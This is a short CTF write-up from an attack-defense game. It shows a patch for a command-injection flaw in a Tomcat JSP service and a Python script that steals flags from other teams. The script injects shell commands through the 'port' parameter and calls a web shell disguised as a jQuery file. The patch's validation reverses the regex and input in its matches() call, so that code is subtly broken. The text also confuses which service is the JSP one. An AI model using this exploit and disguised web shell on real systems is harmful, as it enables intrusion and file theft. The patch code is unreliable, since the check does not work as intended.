# Day 22: muffinCTF

On the second day of the muffinCTF we got two new services: mill and port. I focused on port because mill didn't work at
that time. Mill was a JSP application that was deployed to a Apache Tomcat.

I patched the `searchPortname.jsp` because it allowed remote code execution:

```java
if (request.getParameter("port") != null) {
    String port = request.getParameter("port");

    if (!"^[a-zA-Z0-9\\.]*$".matches(port)) {
        response.sendError(418, "I'm a teapot");
        return;
    }

    // nslookup to port
}
```

Then I used the attack library to steal flags from other players:

```python
def exploit(attack_url):
    output = ''
    common = 'cat%20%2Fopt%2Ftomcat%2Ftomcat-latest%2Fwebapps%2FROOT%2Fuploads%2F*'

    try:
        output += requests.get(attack_url + "searchPortname.jsp?port=%3B%20" + common).text
        output += requests.get(attack_url + "js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp?cmd=" + common).text
    except KeyboardInterrupt:
        sys.exit(1)
    except:
        pass

    return output

muffin_ctf.attack_all('port', exploit)
```
